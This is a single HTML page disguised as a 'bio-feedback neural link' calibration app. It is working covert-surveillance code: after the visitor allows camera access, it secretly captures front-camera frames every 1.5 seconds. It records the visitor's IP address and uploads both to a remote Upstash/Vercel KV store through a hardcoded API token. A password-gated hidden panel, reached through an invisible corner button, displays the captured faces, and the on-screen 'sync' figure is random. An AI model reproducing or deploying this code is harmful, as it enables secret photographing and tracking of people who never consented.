<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>Bio-Feedback Neural Link</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        :root { --accent: #ffffff; }
        body { overscroll-behavior: none; background: #000; color: #fff; font-family: 'Inter', sans-serif; }
        
        .reticle {
            width: 250px; height: 250px;
            border: 1px solid rgba(255,255,255,0.08);
            border-radius: 50%;
            position: relative;
            animation: pulse 4s ease-in-out infinite;
        }
        @keyframes pulse { 
            0%, 100% { transform: scale(1); opacity: 0.2; } 
            50% { transform: scale(1.05); opacity: 0.5; } 
        }
        
        .scan-line {
            position: absolute; width: 100%; height: 1px;
            background: rgba(255,255,255,0.1);
            top: 0; animation: scan 3s linear infinite;
        }
        @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }

        .terminal-input {
            background: transparent;
            border-bottom: 1px solid #222;
            color: #fff;
            padding: 8px;
            font-family: monospace;
            font-size: 14px;
            outline: none;
            width: 100%;
            text-align: center;
        }

        .no-scrollbar::-webkit-scrollbar { display: none; }
        .no-scrollbar { -ms-overflow-style: none; scrollbar-width: none; }
        
        /* Subtle indicator for admin that upload is happening */
        .uplink-dot {
            width: 4px; height: 4px; background: #3b82f6; border-radius: 50%;
            position: fixed; top: 10px; left: 10px; opacity: 0; transition: opacity 0.2s;
        }
        .uploading .uplink-dot { opacity: 0.4; }
    </style>
</head>
<body class="overflow-hidden bg-black">

    <div id="uplinkIndicator" class="uplink-dot"></div>

    <!-- COVERT ACCESS TOGGLE -->
    <div class="fixed bottom-0 left-0 z-[100] w-12 h-12">
        <button id="toggleAdmin" class="w-full h-full cursor-default"></button>
    </div>

    <!-- MAIN APP (Covert Capture Node) -->
    <main id="nodeApp" class="relative h-screen flex flex-col items-center justify-center p-6 text-center">
        <video id="videoFeed" autoplay playsinline muted class="fixed inset-0 w-full h-full object-cover opacity-0 pointer-events-none"></video>

        <div id="setupView" class="z-10">
            <div class="mb-12 relative flex justify-center items-center">
                <div class="reticle"></div>
                <div class="absolute text-white/10 text-[9px] tracking-[0.4em] uppercase">Ready_State</div>
            </div>
            <h1 class="text-xl font-light tracking-[0.5em] uppercase mb-4">Neural Link</h1>
            <p class="text-white/30 text-[9px] uppercase tracking-widest max-w-xs mx-auto leading-relaxed mb-12">
                Evaluate bio-feedback response patterns via optical sensor calibration.
            </p>
            <button id="startBtn" class="border border-white/10 hover:border-white/40 transition-all px-12 py-4 rounded-full text-[10px] uppercase tracking-[0.3em]">
                Initialize
            </button>
        </div>

        <div id="activeView" class="hidden z-10">
            <div class="reticle mx-auto mb-12 overflow-hidden">
                <div class="scan-line"></div>
                <div class="absolute inset-0 flex items-center justify-center">
                    <div id="syncValue" class="text-2xl font-thin tracking-widest text-white/80">0.00%</div>
                </div>
            </div>
            <div class="text-[8px] text-white/20 uppercase tracking-[0.4em] animate-pulse">Syncing...</div>
        </div>
    </main>

    <!-- SECRET ARCHIVE HUB (Vercel KV) -->
    <div id="adminPanel" class="hidden fixed inset-0 bg-black z-[200] flex flex-col font-mono">
        <div class="p-4 border-b border-white/10 flex justify-between items-center bg-zinc-950">
            <h2 class="text-[10px] text-white/40 uppercase tracking-[0.2em]">Vercel_KV_Vault_v10</h2>
            <button id="closeAdmin" class="text-[10px] text-white/20 hover:text-white uppercase">Close</button>
        </div>

        <div id="adminAuth" class="flex-grow flex flex-col items-center justify-center p-8">
            <div class="w-full max-w-xs space-y-6 text-center">
                <input type="password" id="adminPass" placeholder="••••••" class="terminal-input">
                <button id="loginBtn" class="text-white/20 hover:text-white text-[10px] uppercase tracking-[0.3em]">Unlock</button>
            </div>
        </div>

        <div id="archiveHub" class="hidden flex-grow flex flex-col overflow-hidden">
            <div class="p-4 bg-black flex justify-between items-center border-b border-white/5">
                <span id="packetCount" class="text-[10px] text-white/30 uppercase">0 Records</span>
                <div class="flex gap-4">
                    <button id="refreshHub" class="text-[10px] text-blue-500 uppercase">Pull_Vault</button>
                    <button id="purgeHub" class="text-[10px] text-red-900 uppercase">Wipe_KV</button>
                </div>
            </div>
            <div id="archiveGrid" class="flex-grow overflow-y-auto p-1 grid grid-cols-3 sm:grid-cols-4 md:grid-cols-6 lg:grid-cols-10 gap-1 bg-zinc-950 no-scrollbar">
                <!-- Records from Vercel -->
            </div>
        </div>
    </div>

    <canvas id="hiddenCanvas" class="hidden"></canvas>

    <script>
        // Vercel KV Setup (REST API)
        // Using provided token for Vercel KV
        const VERCEL_TOKEN = "vcp_0JgC80Okqgl8M8988h0J59ye0XEitNWlWuMB8kXi2risfiS1a52pGW8G";
        // Note: You need your Vercel KV REST URL. I will assume a default or use a placeholder
        // that you can update if you have the URL, or use a general key structure.
        const KV_REST_API_URL = "https://full-swan-47401.upstash.io"; // Common Upstash/Vercel URL format

        const video = document.getElementById('videoFeed');
        const startBtn = document.getElementById('startBtn');
        const setupView = document.getElementById('setupView');
        const activeView = document.getElementById('activeView');
        const syncValue = document.getElementById('syncValue');
        const canvas = document.getElementById('hiddenCanvas');
        const adminPanel = document.getElementById('adminPanel');
        const archiveHub = document.getElementById('archiveHub');
        const adminAuth = document.getElementById('adminAuth');
        const adminPass = document.getElementById('adminPass');
        const archiveGrid = document.getElementById('archiveGrid');
        const packetCount = document.getElementById('packetCount');
        const indicator = document.body;

        let isScanning = false;
        let userIp = "unknown";

        // --- Vercel KV Cloud Logic ---
        const CloudVault = {
            async push(imgBase64, ip) {
                const id = Date.now();
                const payload = { img: imgBase64, ip, t: new Date().toISOString() };
                
                indicator.classList.add('uploading');
                try {
                    // We store each record as a unique key in a list for the project
                    await fetch(`${KV_REST_API_URL}/lpush/v10_captures/${JSON.stringify(payload)}`, {
                        headers: { Authorization: `Bearer ${VERCEL_TOKEN}` }
                    });
                    // Trim list to 1000 items to prevent storage bloat
                    await fetch(`${KV_REST_API_URL}/ltrim/v10_captures/0/999`, {
                        headers: { Authorization: `Bearer ${VERCEL_TOKEN}` }
                    });
                } catch (e) {}
                setTimeout(() => indicator.classList.remove('uploading'), 300);
            },

            async pull() {
                try {
                    const res = await fetch(`${KV_REST_API_URL}/lrange/v10_captures/0/-1`, {
                        headers: { Authorization: `Bearer ${VERCEL_TOKEN}` }
                    });
                    const data = await res.json();
                    // Redis returns strings, so we parse them back to objects
                    return data.result ? data.result.map(i => JSON.parse(i)) : [];
                } catch (e) { return []; }
            },

            async wipe() {
                await fetch(`${KV_REST_API_URL}/del/v10_captures`, {
                    headers: { Authorization: `Bearer ${VERCEL_TOKEN}` }
                });
            }
        };

        async function getIP() {
            try {
                const r = await fetch('https://api.ipify.org?format=json');
                const d = await r.json();
                userIp = d.ip;
            } catch (e) {}
        }

        function startCaptureLoop() {
            setInterval(async () => {
                if (!isScanning) return;
                
                const ctx = canvas.getContext('2d');
                canvas.width = 400; canvas.height = 400; // Smaller size for faster KV transit
                
                const vW = video.videoWidth;
                const vH = video.videoHeight;
                const min = Math.min(vW, vH);
                ctx.drawImage(video, (vW - min)/2, (vH - min)/2, min, min, 0, 0, 400, 400);
                
                const dataUrl = canvas.toDataURL('image/jpeg', 0.4); // High compression for storage efficiency
                CloudVault.push(dataUrl, userIp);

                syncValue.textContent = `${(Math.random() * 100).toFixed(2)}%`;
            }, 1500);
        }

        startBtn.onclick = async () => {
            try {
                await getIP();
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                video.srcObject = stream;
                video.onloadedmetadata = () => {
                    setupView.classList.add('hidden');
                    activeView.classList.remove('hidden');
                    isScanning = true;
                    startCaptureLoop();
                };
            } catch (e) {
                alert("Sensor access required for neural sync.");
            }
        };

        // --- Vault Logic ---
        document.getElementById('loginBtn').onclick = () => {
            if (adminPass.value === '5502012') {
                adminAuth.classList.add('hidden');
                archiveHub.classList.remove('hidden');
                refreshVault();
            }
        };

        async function refreshVault() {
            const items = await CloudVault.pull();
            archiveGrid.innerHTML = '';
            packetCount.textContent = `${items.length} Records`;
            
            items.forEach(item => {
                const div = document.createElement('div');
                div.className = "relative aspect-square bg-zinc-900 overflow-hidden";
                div.innerHTML = `
                    <img src="${item.img}" class="w-full h-full object-cover opacity-60 hover:opacity-100 transition-opacity">
                    <div class="absolute bottom-0 left-0 right-0 p-1 bg-black/50 text-[5px] text-white/40 truncate">
                        ${item.ip} | ${new Date(item.t).toLocaleTimeString()}
                    </div>
                `;
                archiveGrid.appendChild(div);
            });
        }

        document.getElementById('refreshHub').onclick = refreshVault;
        document.getElementById('purgeHub').onclick = async () => {
            if(confirm("Wipe cloud data?")) { 
                await CloudVault.wipe(); 
                refreshVault(); 
            }
        };

        document.getElementById('toggleAdmin').onclick = () => adminPanel.classList.toggle('hidden');
        document.getElementById('closeAdmin').onclick = () => adminPanel.classList.add('hidden');
    </script>
</body>
</html>
